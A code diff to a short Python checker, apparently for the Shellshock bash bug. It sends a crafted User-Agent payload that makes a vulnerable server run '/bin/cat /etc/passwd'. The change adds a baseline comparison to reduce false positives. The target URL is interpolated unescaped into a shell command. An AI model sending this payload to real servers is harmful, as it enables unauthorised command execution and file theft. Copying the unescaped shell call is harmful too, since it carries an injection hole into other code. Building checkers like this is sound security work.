@@ -5,16 +5,18 @@ import re
 def validate(url):
 # curl -A "() { foo;};echo;/bin/cat /etc/passwd"
   cmd = 'curl --connect-timeout 30 --max-time 60 -A "() { foo;};echo;/bin/cat /etc/passwd" %s' % (url)
+  oldcmd = 'curl --connect-timeout 30 --max-time 60 %s' % (url)
 #  print cmd
-  sh = shell(cmd)
-  cont = sh.output(raw=True)
-  #print cont
+  old_cont = shell(oldcmd).output(raw=True)
+  new_cont = shell(cmd).output(raw=True)
+
   p = re.compile(r'.*?:.*?:\d*?:\d*?:.*?:.*?:.*')
   '''
   match only report from start 0, please use search
   '''
-  m = p.search(cont)
-  if m:
+  m = p.search(new_cont)
+
+  if old_cont != new_cont and m:
     return True
   return False
 
@@ -35,3 +37,4 @@ def main():
 
 if __name__ == '__main__':
   main()
+  # test()
